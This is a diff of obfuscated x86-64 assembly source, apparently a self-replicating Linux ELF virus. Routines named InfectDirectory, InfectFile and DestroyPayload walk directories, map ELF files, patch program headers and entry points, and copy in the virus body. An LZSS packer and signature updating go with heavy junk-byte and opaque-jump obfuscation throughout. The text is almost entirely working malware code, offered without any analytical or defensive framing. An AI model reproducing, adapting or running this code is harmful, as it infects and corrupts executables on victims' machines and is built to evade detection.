+    mov         QWORD [r2+p_h.p_filesz], r4
+    mov         QWORD [r2+p_h.p_memsz], r4
+    jmp         $+4
+db 0x06, 0x32
+    jmp         $+4
+db 0xcd, 0x25
+    jmp         $+5
+db 0x75, 0x4e, 0x0c
+    je          ..@5NbC2vKra5FA
+    jne         ..@5NbC2vKra5FA
+..@KpXu9MtZyJFz:
+    cmp         rax, 0xffffffffffffffff
+    je          ..@ViiT1xQWe48y
+    jb          ..@XjgcM2fSOTIb
+    jae         ..@XjgcM2fSOTIb
+..@XpZ3fLZotp95:
+    mov         edx, LOOKAHEAD_LENGTH
+    cmp         ax, LOOKAHEAD_LENGTH
+    cmovl       dx, ax
+    jmp         $+4
+db 0x1c, 0xe4
+    jb          ..@f8MMphwCNwOe
+    jae         ..@f8MMphwCNwOe
+..@UCOARpXYYQaV:
+    rep         movsb
+    je          ..@Ac8oKpcozywR
+    jne         ..@Ac8oKpcozywR
+..@3IdYQ2ZFvaX2:
+    mov         QWORD [r5+file.filesize], rax
+    jb          ..@NjTnMfEK7Rpu
+    jae         ..@NjTnMfEK7Rpu
+..@ZzVbKnpg1EWo:
+    pop         r1
+    jmp         $+3
+db 0xd4
+    jmp         $+4
+db 0xf9, 0xe5
+    jmp         ..@0pDGmNIMMlxe
+..@NX9BOq6k6dD6:
+    ret
+    jl          InfectFile
+    jge         InfectFile
+..@i6vKuDFjYDqp:
+    add         r4, r3
+    jmp         $+3
+db 0xa1
+    jmp         $+5
+db 0xef, 0xc5, 0x94
+    jmp         $+4
+db 0x09, 0x71
+    jmp         ..@cBMxW4sJqczX
+..@VxA138Idaxwn:
+    pop         r3
+    pop         r2
+    pop         r1
+    js          ..@WKSwXRYiNmBV
+    jns         ..@WKSwXRYiNmBV
+..@tHjjQxPTE62q:
+%ifdef X86_64
+    xor         rax, rax
+    xor         rdi, rdi
+%endif
+    jmp         $+4
+db 0x5d, 0xf9
+    js          ..@22PLG1gO79rZ
+    jns         ..@22PLG1gO79rZ
+..@j3OxBzfEmxF6:
+    add         rdi, virus_len-_start
+    jmp         ..@yIJugsBfnfCm
+..@o6eAyaB49r4z:
+    call        Strcpy
+    lea         r2, [rsp+_PROC_OFF.dirbuf+linux_dirent.d_name+r4]
+    js          ..@h4CdhiZkNGku
+    jns         ..@h4CdhiZkNGku
+..@HmxzdvpnE7bh:
+    mov         m7, rdi
+    jmp         ..@5pK2K35EwNbI
+..@J9s4u9Tbngej:
+    pop         r4
+    ret
+    jb          UnmapFile
+    jae         UnmapFile
+..@4PTYO4XqPlDG:
+    lea         r1, [rsp+_INFFILE_OFF.file]
+    call        UnmapFile
+    mov         r2, 11b
+    jb          ..@wAMkOLKQilw4
+    jae         ..@wAMkOLKQilw4
+..@HuVTGdMto0ir:
+    and         eax, 0xff
+    or          edi, eax
+    js          ..@V3Di2odKj8nx
+    jns         ..@V3Di2odKj8nx
+MemMove:
+    jmp         ..@8N577lJvlwm9
+..@J4AoCAjHY5Y3:
+%ifdef X86_64
+    syscall
+%endif
+    jmp         ..@RgYpBPPfuPHY
+..@uMdi2HPmBtew:
+    mov         r1, QWORD [r5+file.fileptr]
+    mov         r2, QWORD [r5+file.filesize]
+    jb          ..@eRWtE3wBUbL4
+    jae         ..@eRWtE3wBUbL4
+..@DAodRufKxsoa:
+%ifdef X86_32
+    mov         esi, r2
+%endif
+    jmp         $+4
+db 0x75, 0x2e
+    jb          ..@ARKp79bYIGkM
+    jae         ..@ARKp79bYIGkM
+..@zhU3qJ93gPC1:
+    jmp         ..@qjamrc8Zkrya
+    js          ..@1qvRUY99GgtH
+    jns         ..@1qvRUY99GgtH
+..@oRDoP9DAaATR:
     add         rsp, _UPDATASIG_OFF_size
     pop         r5
     pop         r4
+    jl          ..@BOtHOiiC7u0U
+    jge         ..@BOtHOiiC7u0U
+..@LA5MkaFRvHa5:
+    je          ..@gEK5sDBcQYmo
+    jmp         $+4
+db 0x5c, 0xfa
+    je          ..@bMw3eRIC6lrR
+    jne         ..@bMw3eRIC6lrR
+..@NbtSBmqxXclB:
+    syscall
+    cmp         eax, 0x00
+    jl          ..@RzdPHosprkxK
+    jl          ..@wWabWtHX888k
+    jge         ..@wWabWtHX888k
+..@63uVPBpBSaNE:
+    xor         r3, r3
+    xor         r4, r4
+    jmp         $+4
+db 0x2b, 0x90
+    jl          ..@549ARsO3O1OT
+    jge         ..@549ARsO3O1OT
+..@Rd58TJuBDh03:
+    add         rsp, _PAYLOAD_OFF_size
     jmp         $+5
-db 0xcf, 0x12, 0x23
-    jb          ..@5sdBo8hPKRyb
-    jae         ..@5sdBo8hPKRyb
-..@uhcQ4Roh9CJw:
-    mov         r4, 0x1
-    jmp         ..@wnMcuPy5FUgy
-..@JdTG9TjWqhmY:
-    add         r4, r3
-    jmp         ..@ESiCsSHVmHIn
-..@SpAWFW4KycJU:
+db 0x43, 0xb8, 0x7e
+    jmp         $+5
+db 0x0a, 0x65, 0x72
+    jmp         ..@nU3RMRtn2ztW
+..@3vQ1fz9XFZya:
+    mov         r2, vsp
+    je          ..@WSK8StwspNBB
+    jne         ..@WSK8StwspNBB
+..@8GmdO8WyLAZV:
+    xor         rax, rax
+    xor         r2, r2
+    mov         r1, m6
+    jmp         $+3
+db 0x3f
+    jb          ..@ffxxTpdtCFdh
+    jae         ..@ffxxTpdtCFdh
+..@zTfBb3vsAlu4:
+    push        r1
+    mov         r5, r1
+    xor         rax, rax
+    jmp         $+5
+db 0x6a, 0x8a, 0x68
+    jl          ..@uMdi2HPmBtew
+    jge         ..@uMdi2HPmBtew
+..@eDvIPiZixItI:
+    xor         rax, rax
+    mov         al, BYTE [rsp+_LZSSE_OFF.mask]
+    or          BYTE [rsp+_LZSSE_OFF.bits], al
+    jmp         $+4
+db 0x3a, 0x83
+    jmp         $+3
+db 0x57
+    jmp         $+5
+db 0xd6, 0xaf, 0x56
+    jmp         ..@YtcnbgTDtOVG
+..@oRIIsOKnwQqg:
+    mov         ecx, WINDOW_LENGTH*2
+    xor         rax, rax
+    jmp         $+3
+db 0x3a
+    jmp         $+3
+db 0xc9
+    js          ..@PELDalgIzKzL
+    jns         ..@PELDalgIzKzL
+..@LBvF0a3A4JXs:
+    add         r4, 1
+    jmp         $+4
+db 0x7a, 0x6b
+    jmp         ..@WhpQIqB4Bbmo
+..@UmJW36cAwyLW:
+    xor         rax, rax
+    jmp         $+3
+db 0x09
+    jmp         ..@Zq3kKy5r6JMo
+..@cj9uaDZq2Jm5:
+    cmp         BYTE [rsp+_LZSSE_OFF.match_len], MIN_LENGTH
+    jge         ..@1qvRUY99GgtH
+    mov         BYTE [rsp+_LZSSE_OFF.match_len], 0x1
+    js          ..@UmJW36cAwyLW
+    jns         ..@UmJW36cAwyLW
+..@6yUGC7xASBts:
+    ret
+    js          LzssEncoder
+    jns         LzssEncoder
+..@yIJugsBfnfCm:
+    mov         rsi, m7
+    jl          ..@s31trFTZGrWP
+    jge         ..@s31trFTZGrWP
+..@549ARsO3O1OT:
+    mov         r5, [rsp+_NBF_OFF.file]
+    mov         r1, QWORD [r5+file.fileptr]
+    jmp         ..@ceESOjpVmhyB
+..@Ac8oKpcozywR:
+    xor         rax, rax
+    xor         r1, r1
+    mov         r1w, WORD [rsp+_UPDATASIG_OFF.index] 
+    jmp         $+4
+db 0x0b, 0xd0
+    jmp         ..@nTxJtYmQhjW8
+..@UeDdX8n7MC9z:
+    add         QWORD [rsp+_INFDIR_OFF.dirindex], rax
+    jb          ..@gb8GclFahczY
+    jae         ..@gb8GclFahczY
+..@22onvSzSSWlU:
+    add         r1, signature_len
+    mov         r3, QWORD [r5+file.filesize]
     call        MemMove
     jmp         $+3
-db 0xcd
-    jmp         ..@8XoilklbxX3T
-..@Xz94S5R0nMP4:
-    call        DYNPIEValidation
+db 0x13
+    jl          ..@8bhq8GrRkYyw
+    jge         ..@8bhq8GrRkYyw
+..@33Q4If3rtkYg:
+    mov         r1, r5
+    jmp         $+5
+db 0x7c, 0x83, 0xca
+    jmp         $+5
+db 0x75, 0x34, 0x0a
+    jl          ..@dsVUctmfwAjD
+    jge         ..@dsVUctmfwAjD
+..@JpUHAHTziuB7:
+    mov         r4d, DWORD [r1 + file.filefd]
+    mov         r5, r1
+    jmp         $+5
+db 0x05, 0x83, 0x98
+    jl          ..@Niqdd0lU3Zu5
+    jge         ..@Niqdd0lU3Zu5
+..@qhz8z9q6qBDh:
+%ifdef X86_32
+    mov         edi, 0xffffffff
+%endif
+    jb          ..@3Jhbev2ZJEeL
+    jae         ..@3Jhbev2ZJEeL
+..@sN2zXiV0UFov:
+    jl          ..@9vHlxQj499aM
+    mov         r4, r5
+    mov         r5, [rsp]
+    jl          ..@LeSl1KImZMnY
+    jge         ..@LeSl1KImZMnY
+..@DzSAkiy6D7Fb:
+    sub         rsp, _INFFILE_OFF_size
+    mov         QWORD [rsp+_INFFILE_OFF.file+file.filename], r1
+    lea         r1, [rsp+_INFFILE_OFF.file]
+    js          ..@xLM2yX8Ho5Kt
+    jns         ..@xLM2yX8Ho5Kt
+..@tWtXJ5a7f5r8:
+    CFILE       DWORD [rsp+_PROC_OFF.dirfd]
+    jb          ..@E5hVQgUHALoU
+    jae         ..@E5hVQgUHALoU
+..@XaU1CGE0as4V:
+    je          ..@GmHTSRd027zE
     jmp         $+4
-db 0x05, 0x96
-    jl          ..@ojYYcruAo1CH
-    jge         ..@ojYYcruAo1CH
-..@tvphuN1THXBF:
-    add         rdi, virus_len-_start
-    mov         rsi, m7
+db 0xbf, 0xd1
+    jb          ..@VVBHaBlNihaD
+    jae         ..@VVBHaBlNihaD
+..@UTAheQLoudYG:
+    ret
+    jmp         $+3
+db 0xd6
+    jmp         ..@R4FxM6IERCtl
+..@v5DUdKckfirm:
+%ifdef X86_64
+    mov         rcx, rdx
+%endif
+    jl          ..@T8hC4TMN2f7u
+    jge         ..@T8hC4TMN2f7u
+..@pmkghotGYKwD:
+    xor         rax, rax
+    mov         r3, [r1+e_h.e_phoff]
+    lea         r4, [r1]
+    jmp         $+5
+db 0x5a, 0x15, 0x6f
+    jmp         $+3
+db 0x2d
+    jb          ..@i6vKuDFjYDqp
+    jae         ..@i6vKuDFjYDqp
+..@p7ScmdMeeNVW:
+    xor         rax, rax
+    jmp         $+4
+db 0x4f, 0x7d
+    jmp         ..@az5roZGdhsEm
+..@UsVfVNYvzoOb:
+    jnz         ..@R4FxM6IERCtl
+    jb          ..@XmSofxDnpzEy
+    jae         ..@XmSofxDnpzEy
+..@zHf20fCsNJWV:
+    jz          ..@xcJAVtwS8bU8
+    add         rax, 4
+    jmp         $+4
+db 0x77, 0x45
+    jmp         ..@tfJb39ROecoI
+..@TrY8TMOOygZR:
+    VAR         packed, dirs_tmp
+    jmp         $+5
+db 0x8e, 0x94, 0xed
+    jmp         ..@FvpNHFZl78ra
+..@htprqlefq5Hb:
+    mov         ecx, PADDING
+    mov         eax, 0x00
+    js          ..@gdDKzjoZgtOS
+    jns         ..@gdDKzjoZgtOS
+..@gEK5sDBcQYmo:
+    mov         r1, QWORD [r5+file.fileptr]
+    mov         r2, QWORD [r1+e_h.e_entry]
+    jl          ..@m2l5jpkN32Ru
+    jge         ..@m2l5jpkN32Ru
+..@cTeLFbPfQDzc:
+    mov         r2, m5
+    jmp         $+5
+db 0x30, 0x9a, 0x94
+    jl          ..@CvDTA8oVitCy
+    jge         ..@CvDTA8oVitCy
+IsELFComplete:
+    jmp         ..@nnfXH979z2cH
+..@LWhXC9HX8Hwm:
+    mov         r2, r1
+    jmp         $+5
+db 0xaa, 0xde, 0xe5
+    jl          ..@22onvSzSSWlU
+    jge         ..@22onvSzSSWlU
+..@xfTPgyrccQWI:
+    mov         rax, QWORD [rsi+rcx+bytes]
+    and         rax, DF_1_PIE
+    jmp         $+5
+db 0x22, 0x60, 0x16
+    jmp         $+5
+db 0x50, 0x62, 0x2d
+    jb          ..@oc8ckKAzxlXN
+    jae         ..@oc8ckKAzxlXN
+..@4ANICuqNYxxG:
+    mov         r1, r5
+    jmp         $+5
+db 0xa0, 0xcb, 0x7e
+    je          ..@M5X3BnBt52ar
+    jne         ..@M5X3BnBt52ar
+..@DF40Ye6VsElw:
+    mov         ecx, WINDOW_LENGTH-LOOKAHEAD_LENGTH 
+    lea         rdi, QWORD [rsp+_LZSSE_OFF.buffer] 
+    jmp         $+5
+db 0x80, 0x06, 0x84
+    je          ..@igFgXO1vDWWG
+    jne         ..@igFgXO1vDWWG
+..@0P4QRNrdhrYo:
+    add         r1, QWORD [r2]
+    mov         QWORD [rsp+_DYNPIE_OFF.sh_ptr], r1
+    xor         rbx, rbx
+    jb          ..@IeWHdtvy0mkF
+    jae         ..@IeWHdtvy0mkF
+..@saqN5JMUfBgR:
+    call        UpdateSignature
+    mov         r1, m6
+    je          ..@91I78QCFUTJy
+    jne         ..@91I78QCFUTJy
+..@XNvXzTJxKSFt:
+    mov         dx, WORD [rsp] 
+    jmp         $+3
+db 0x29
+    je          ..@VB1JQf5UfmqE
+    jne         ..@VB1JQf5UfmqE
+..@aHIbMhtktNDd:
+    cmp         r4, 0x00
+    jmp         $+5
+db 0x61, 0x79, 0xb1
+    jb          ..@PIKL46ekOib4
+    jae         ..@PIKL46ekOib4
+..@emjYrA44lYPe:
+    lea         r1, [rsp+_INFFILE_OFF.file]
+    jb          ..@X1ECtKy8btt0
+    jae         ..@X1ECtKy8btt0
+..@zSgAQGSpaPx3:
+    add         r1, 1
+    jmp         $+3
+db 0x0d
+    jmp         ..@ea6y2kJGRO6Q
+..@7p3CvulN7ik3:
+    push        r1
+    jmp         $+4
+db 0xfa, 0x00
+    jmp         $+4
+db 0x47, 0x78
+    jmp         $+5
+db 0xe8, 0xa8, 0x8b
+    jmp         ..@CbT9Jb8MUQQ9
+..@mHmEoXiu7NjD:
+    mov         eax, 0x0
+    jmp         $+3
+db 0x1d
+    jmp         $+5
+db 0x72, 0x8b, 0x22
+    jb          ..@dYfL5bIlrkXN
+    jae         ..@dYfL5bIlrkXN
+..@mLQhfk7cMGUC:
+    add         r4, r3
+    jl          ..@LBvF0a3A4JXs
+    jge         ..@LBvF0a3A4JXs
+..@9mXnQCpM1lZS:
+    xor         rax, rax
+    jmp         $+5
+db 0x4e, 0x4e, 0xa0
+    jmp         $+3
+db 0x20
+    jl          ..@W82JEt0LdV91
+    jge         ..@W82JEt0LdV91
+..@ksG3E592URJM:
+    sub         rcx, rax
+    jmp         ..@nb8j1yOPBjcj
+..@GFM74VBidX4S:
+    add         rdi, rax
+    jmp         $+4
+db 0x19, 0x21
+    jmp         $+4
+db 0xe4, 0x80
+    jmp         ..@C1eZv0BFC7yJ
+..@WKSwXRYiNmBV:
+    cmp         QWORD m6, 0x00
+    je          ..@oz0w6dKg0d2f
+    cmp         QWORD m7, 0x00
+    jmp         $+3
+db 0x93
+    js          ..@u01arBYN9hMA
+    jns         ..@u01arBYN9hMA
+..@ZP0tJIpC5Yac:
+    cmp         rax, 0x00
+    jle         ..@oz0w6dKg0d2f
+    jmp         ..@zsh4RuWlDQCS
+DestroyPayload:
+    jmp         ..@53Mc727uXALt
+..@2mxMqNlQBChT:
+    ret
+    js          IsNum
+    jns         IsNum
+..@YGijnXnHzcof:
+    cmp         rax, 0x00
+    jl          ..@5yXTzM9nOrnz
+    xor         r4, r4
+    jmp         ..@KJ91uacatmQI
+..@q2kzdUowKCZP:
+    xor         r1, r1
+    jmp         $+4
+db 0x52, 0x0a
+    js          ..@5Nm77R9P6Ml5
+    jns         ..@5Nm77R9P6Ml5
+..@558pDbgxYslW:
+    xor         rax, rax
+    xor         rdi, rdi
+    jmp         $+3
+db 0x5e
+    jmp         $+4
+db 0x39, 0x44
+    jmp         ..@Ni2CGNpMTv9e
+..@t3O3ODVmZ4pz:
+    mov         QWORD m5, 0x01
+    push        0x00
+    jmp         $+5
+db 0x6f, 0xa1, 0x00
+    js          ..@SxuJviyzmB6d
+    jns         ..@SxuJviyzmB6d
+..@uvKPMbLEa5kL:
+    add         rdi, non_packed_len
+    jmp         $+4
+db 0xc7, 0x6a
+    jmp         $+4
+db 0x39, 0x6e
+    jmp         ..@HmxzdvpnE7bh
+..@Kqr5qSPMZRgl:
+    pop         r3
+    jmp         ..@Ie6t8FunBGSt
+..@Owf8jAwl3pU1:
+    mov         ax, WORD [r5+linux_dirent.d_reclen]
+    jb          ..@65Fxm98FmkTy
+    jae         ..@65Fxm98FmkTy
+..@vnhlexeQjq4t:
+    and         r2, 0x00ffffff
+    cmp         r2d, '../'
+    je          ..@cGP4eVS9c0f1
+    jmp         $+5
+db 0xe8, 0x37, 0x0b
+    jmp         $+4
+db 0xb1, 0xe3
+    js          ..@HHMH1QTmd0ga
+    jns         ..@HHMH1QTmd0ga
+..@NMPApKGAWw8J:
+    mov         BYTE [rsp+_LZSSE_OFF.bits], 0x00
+    mov         BYTE [rsp+_LZSSE_OFF.mask], 10000000b
+    inc         QWORD [rsp+_LZSSE_OFF.outputaddr] 
+    jmp         $+5
+db 0xcc, 0x74, 0x53
+    jmp         ..@deLH2ZVwwuI3
+..@c5UJBFEtM3SR:
+    cmp         cl, 0x4
+    jl          ..@VB1JQf5UfmqE
+    jmp         $+3
+db 0x82
+    jl          ..@aqQJId3DOxJd
+    jge         ..@aqQJId3DOxJd
+..@ysMlpUVNjnx6:
+    push        r1
+    push        r2
+    jl          ..@SqoLC1wbJHvN
+    jge         ..@SqoLC1wbJHvN
+..@dsVUctmfwAjD:
+    add         r1, r4
+    cmp         BYTE [r1], 0x00
+    je          ..@5yXTzM9nOrnz
+    js          ..@nl4gVcKkxDzt
+    jns         ..@nl4gVcKkxDzt
+..@ooCeATET1k6E:
+    je          ..@cGP4eVS9c0f1
+    jmp         $+5
+db 0xfe, 0x2c, 0x87
+    jmp         $+5
+db 0x98, 0x75, 0x50
+    jmp         $+5
+db 0x89, 0x58, 0x8a
+    jb          ..@nCZuxecWubzp
+    jae         ..@nCZuxecWubzp
+..@8E6n7NgFN6PI:
+    push        r4
+    jmp         ..@T2aQ8F6bVsjc
+..@8N577lJvlwm9:
+    push        r4
+    push        r5
+    jmp         $+4
+db 0x11, 0x71
+    je          ..@KaLksZ5wSH74
+    jne         ..@KaLksZ5wSH74
+InfectDirectory:
+    jmp         ..@mkEbUBw5QjK2
+..@pXOpto1Nenc7:
+    mov         rax, r4
+    movzx       r3, WORD [r1+e_h.e_phentsize]
+    jmp         $+4
+db 0xd0, 0xef
+    jmp         $+3
+db 0x83
+    je          ..@MlSzyU5l2RYt
+    jne         ..@MlSzyU5l2RYt
+..@vPMrJesYLSXe:
+    xor         rax, rax
+    jb          ..@P0qnMkDF7Z4Q
+    jae         ..@P0qnMkDF7Z4Q
+..@SqoLC1wbJHvN:
+    push        r3
+    js          ..@LZ5jIelEW7yJ
+    jns         ..@LZ5jIelEW7yJ
+..@0oWYtjhg8wT9:
+    lea         r1, [rsp+_INFFILE_OFF.file]
+    mov         r2, r4
+    js          ..@1vYdz2IxqmUj
+    jns         ..@1vYdz2IxqmUj
+..@8OqqD9iVOi9f:
+%ifdef X86_64
+    syscall
+%endif
+    jb          ..@KpXu9MtZyJFz
+    jae         ..@KpXu9MtZyJFz
+..@m2l5jpkN32Ru:
+    test        r2, r2
+    jz          ..@R4FxM6IERCtl
+    jmp         ..@FcWd8IQOLEut
+..@o23wt7vYA5Cr:
+    mov         BYTE [r1], 0x00
+    jmp         ..@ljb9zJ1jAXr6
+..@B8ejZoBIydNL:
+    lea         r1, [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_name+r4]
+    cmp         BYTE [r1], '.'
+    je          ..@LYYdE28N9k6i
+    jne         ..@LYYdE28N9k6i
+..@l31929toBcuu:
+    test        r2, r2
+    jmp         $+4
+db 0xb6, 0x79
+    jl          ..@ScIVejNrJtUP
+    jge         ..@ScIVejNrJtUP
+..@TFIJ1m0WvM70:
+    mov         r1, QWORD [rsp+_INFFILE_OFF.file+file.fileptr]
+    add         r1, QWORD [rsp+_INFFILE_OFF.file+file.filesize]
+    jmp         ..@9sFjqZXTAW8V
+..@NOnmaeYF4hkj:
+    sub         rsp, _NBF_OFF_size
+    mov         WORD [rsp+_NBF_OFF.index], r2w
+    mov         QWORD [rsp+_NBF_OFF.file], r1
+    jmp         $+5
+db 0xa3, 0x7b, 0xfa
+    jmp         $+5
+db 0x0a, 0x09, 0x43
+    jmp         $+3
+db 0x09
+    jl          ..@B6iOLoxgCiSm
+    jge         ..@B6iOLoxgCiSm
+..@i5I1SLnji789:
+    syscall
+    jmp         $+5
+db 0x87, 0x60, 0xd0
+    js          ..@YDtdfe1Sq8CO
+    jns         ..@YDtdfe1Sq8CO
+..@FJbzAIJlRe5q:
+    mov         WORD [rsp+_LZSSE_OFF.match_pos], bx
+    jb          ..@fuN7j2mTKt4h
+    jae         ..@fuN7j2mTKt4h
+..@SMckVljYm5Au:
+    sub         rcx, m6
+    mov         eax, 0x00
+    rep         stosb
+    jl          ..@8GmdO8WyLAZV
+    jge         ..@8GmdO8WyLAZV
+..@xzzSlNn6IaZj:
+    add         r4, 1
+    jmp         $+5
+db 0x65, 0x75, 0xf7
+    jb          ..@UY6ONonz96eO
+    jae         ..@UY6ONonz96eO
+..@dHBJw1fYedmk:
+    add         rbx, 1
+    mov         rsi, QWORD [rsp+_DYNPIE_OFF.ptr]
+    jmp         $+3
+db 0xa1
+    jb          ..@xryDQ1y2I9LD
+    jae         ..@xryDQ1y2I9LD
+..@FvpNHFZl78ra:
+    mov         r1, r5
+    cmp         BYTE [r1], 0x00
+    js          ..@5vI6f72u2sFK
+    jns         ..@5vI6f72u2sFK
+..@mkescq5Qdjvs:
+    push        r1
+    jmp         $+3
+db 0x2a
+    jmp         $+5
+db 0xb4, 0x9a, 0x8d
+    jmp         ..@q11p1b4bNtPS
+..@RzdPHosprkxK:
+    ret
+    jmp         InfectDirectory
+..@FTJjUvbnymZA:
+    je          ..@Rd58TJuBDh03
+    xor         r3, r3
+    jmp         $+3
+db 0x6f
+    js          ..@uIQSLyUme2Zn
+    jns         ..@uIQSLyUme2Zn
+..@B6iOLoxgCiSm:
+    mov         r1, [rsp+_NBF_OFF.file]
+    jmp         $+5
+db 0x42, 0x91, 0x3e
+    jmp         ..@Ny0Pgk64lueE
+..@ri6MwqARLp4A:
+    mov         dx, WORD [rsp+_LZSSE_OFF.la_index]
+    jmp         $+5
+db 0xe6, 0x95, 0xfd
+    jl          ..@T2pgqwjQxm1Z
+    jge         ..@T2pgqwjQxm1Z
+FileValidation:
+    jmp         ..@15ZyIFNswynd
+..@rN09HOLWLKkx:
+    mov         QWORD [rsp+_VADDR_OFF.tmp_vaddr], 0
+    mov         QWORD [rsp+_VADDR_OFF._vaddr], 0
+    jmp         ..@pmkghotGYKwD
+..@ceESOjpVmhyB:
+    mov         r2w, WORD [rsp+_NBF_OFF.index]
+    call        UpdateSignature
+    mov         r1, QWORD [r5+file.fileptr]
+    jmp         $+3
+db 0x78
+    js          ..@smKLMgXPkga9
+    jns         ..@smKLMgXPkga9
+..@nl4gVcKkxDzt:
+    lea         r2, [rsp+_PROC_OFF.buffer+0x6]
+    js          ..@vq7wrNrSDKxp
+    jns         ..@vq7wrNrSDKxp
+..@E12MtQHXIwJa:
+    mov         rax, 1
+    jmp         $+5
+db 0xe2, 0x3a, 0x4e
+    jmp         $+5
+db 0xfb, 0xcb, 0x8d
+    jmp         ..@RSUiE4NS5Pmy
+..@xebuhO6qp8CY:
+    jge         ..@dHBJw1fYedmk
+    cmp         QWORD [rsi+rcx], DT_FLAGS_1
+    jmp         $+5
+db 0xd0, 0x2b, 0x83
+    jmp         ..@HfdYQqV1YVi6
+..@7BbPjQEwPe47:
+    jne         ..@cS6c66HTlUaz
+    jmp         $+4
+db 0x02, 0xf3
+    jmp         ..@M2BZ7QA3lU5h
+..@96H6TQfqgoQW:
+    mov         r2w, WORD [rsp+_PAYLOAD_OFF.index]
+    mov         r3d, DWORD [rsp+_PAYLOAD_OFF.key]
+    mov         r4, 0
+    je          ..@saqN5JMUfBgR
+    jne         ..@saqN5JMUfBgR
+..@aFecCX8SInui:
+    mov         rcx, m7
+    jb          ..@SMckVljYm5Au
+    jae         ..@SMckVljYm5Au
+IsNum:
+    jmp         ..@wGno3Lq37lNv
+..@dPD0BooPh80v:
+    xor         rax, rax
+    lea         r1, [rsp+_PROC_OFF.dirbuf+r4]
+    mov         ax, WORD [r1+linux_dirent.d_reclen]
+    js          ..@qah3BI5phGpq
+    jns         ..@qah3BI5phGpq
+..@TG2SY1lJr2M4:
+    sub         QWORD [rsp+_LZSSE_OFF.length], rcx
+    jmp         ..@5T6asNugz2P0
+..@pbjYpIfgL2ih:
+    test        eax, eax
+    jmp         $+3
+db 0xd7
+    je          ..@FDTmGGmiDg17
+    jne         ..@FDTmGGmiDg17
+..@rcCjuVt271rR:
+    add         rdi, _signature.index-_signature.start
+    mov         DWORD [rdi], eax
+    jmp         ..@oRDoP9DAaATR
+..@TxnqhqKazGEX:
+    mov         WORD [rsp+_UPDATASIG_OFF.index], r2w
+    GGLOBAL     _signature.start
+    jmp         $+3
+db 0x15
+    jmp         $+4
+db 0xc2, 0x38
+    jmp         $+3
+db 0x9c
+    jmp         ..@WQihQLcGfcf2
+..@eEJkBNoajoIV:
+    cmp         al, 0xa
+    jmp         $+5
+db 0xd9, 0xfc, 0x6a
+    jmp         ..@4snTVLGmzYkL
+..@4snTVLGmzYkL:
+    jl          ..@sv2ZjJ5lBsEf
+    jb          ..@ds0Qm8DOLW7U
+    jae         ..@ds0Qm8DOLW7U
+..@EtJdDshjWXXW:
+    cmp         rax, 0x00
+    jle         ..@tWtXJ5a7f5r8
+    mov         QWORD [rsp+_PROC_OFF.dirnread], rax
+    jmp         $+5
+db 0x9c, 0xad, 0x6d
     jmp         $+3
 db 0xc7
-    jl          ..@vKrj5fTFfEcj
-    jge         ..@vKrj5fTFfEcj
-..@gXtFxQ2HVyR0:
+    jmp         ..@PoqDx0pqFdd3
+..@cPJMfmdalc2W:
+    call        DestroyPayload
+    jmp         ..@oz0w6dKg0d2f
+..@FH0BkZoIzYyv:
+    mov         QWORD [r5+file.filesize], r3
+    jmp         $+3
+db 0x4b
+    je          ..@be6BcuOpQGuC
+    jne         ..@be6BcuOpQGuC
+..@cVnpZp6h4CT9:
+    sub         rsp, _DYNPIE_OFF_size
     xor         rax, rax
-    js          ..@XetoShgGz7aW
-    jns         ..@XetoShgGz7aW
-..@D5Wqi7wAM3ma:
-    rep movsb 
-    jmp         ..@AhYZ2QbGV74B
-..@GR4PWfpDAadO:
-    mov         rdi, QWORD [rsp+_LZSSE_OFF.outputaddr]
+    jb          ..@Y7NtDm9eoh4u
+    jae         ..@Y7NtDm9eoh4u
+..@M5X3BnBt52ar:
+    OFILE       [r1], 0x10000
+    cmp         eax, 0x03
+    je          ..@Ktrqqo6CscD3
+    jne         ..@Ktrqqo6CscD3
+..@xAqfyvYECtTD:
+    mov         r2, QWORD [rsp+_INFDIR_OFF.dirname]
+    call        Strcpy
+    mov         BYTE [r1], '/'
+    jl          ..@JuywueUZvW7l
+    jge         ..@JuywueUZvW7l
+..@fkZj1tYVPfrB:
+    or          bx, dx
+    jmp         ..@zhU3qJ93gPC1
+..@zAiDqZUNyCK2:
+    xor         rbx, rbx
+    xor         rdx, rdx
+    mov         al, BYTE [rsp+_LZSSE_OFF.match_len]
+    je          ..@mS30275tJASv
+    jne         ..@mS30275tJASv
+UnmapFile:
+    jmp         ..@zTfBb3vsAlu4
+..@YtcnbgTDtOVG:
+    shr         BYTE [rsp+_LZSSE_OFF.mask], 1
+    jmp         ..@43y2LsKZfc2a
+..@ViiT1xQWe48y:
+    xor         rax, rax
+    jmp         $+3
+db 0x58
+    jmp         ..@NRGNa6W3oCUn
+..@5T6asNugz2P0:
+    lea         rdi, [rsp+_LZSSE_OFF.buffer]
+    xor         rax, rax
+    je          ..@zlP8TzrwGrMm
+    jne         ..@zlP8TzrwGrMm
+..@aGQgpSjJ10zS:
+    mov         r2b, BYTE [rsp+_INFDIR_OFF.depth]
+    add         r2, 1
+    call        InfectDirectory
+    jmp         $+5
+db 0x46, 0xcf, 0x99
+    jl          ..@ipFKcvr45wQl
+    jge         ..@ipFKcvr45wQl
+..@oyoqPVLAw2uN:
+    mov         QWORD [rsp+_LZSSE_OFF.inputaddr], rsi
+    je          ..@ZBAxqXiSk8Vs
+    jne         ..@ZBAxqXiSk8Vs
+..@e051e89yAKXG:
+    je          ..@FaUNt1bceu6m
+    cmp         rax, 0x01
+    js          ..@jfJUAMCAZAwp
+    jns         ..@jfJUAMCAZAwp
+..@TP3zax1Pdf2L:
+    xor         rax, rax
+    jmp         $+5
+db 0xc6, 0xd0, 0x9d
+    jl          ..@7AzfoYaFybFW
+    jge         ..@7AzfoYaFybFW
+..@15ZyIFNswynd:
+    mov         r5, r1
+    jl          ..@h8utXn83wrLY
+    jge         ..@h8utXn83wrLY
+..@GrTpQe5FK9bE:
+    add         ecx, 1
+    jb          ..@xlfIajT2jGiZ
+    jae         ..@xlfIajT2jGiZ
+..@tnlQWRI74ZDU:
+    call        GetNewProgramVaddr
+    jmp         $+3
+db 0x10
+    js          ..@KJvTHENEDQxJ
+    jns         ..@KJvTHENEDQxJ
+..@ScIVejNrJtUP:
+    jnz         ..@R4FxM6IERCtl
     jmp         $+4
-db 0x75, 0xa6
+db 0x11, 0x28
+    je          ..@AulT9fKsgL1j
+    jne         ..@AulT9fKsgL1j
+..@VVBHaBlNihaD:
+    jmp         ..@02DoeAJ124yA
+    jb          ..@GmHTSRd027zE
+    jae         ..@GmHTSRd027zE
+..@LXCReLo1Ftbm:
+    test        rax, rax
+    jmp         $+4
+db 0x9b, 0xb4
     jmp         $+3
-db 0x8a
